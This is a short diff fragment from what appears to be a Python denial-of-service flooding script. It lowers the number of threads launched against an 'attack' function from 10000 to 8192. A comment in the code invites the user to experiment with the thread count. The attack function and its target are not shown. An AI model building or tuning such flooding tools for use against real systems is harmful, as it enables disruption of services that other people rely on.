@@ -213,7 +213,7 @@ elif options == "2" :
             s.close()  # This helps to close a detached socket.
 
 
-    for i in range(10000) :
+    for i in range(8192) :
         thread = threading.Thread(target=attack)
         thread.start()
         """In this case we are starting 10000 threads that will execute our function, of course you can play around with
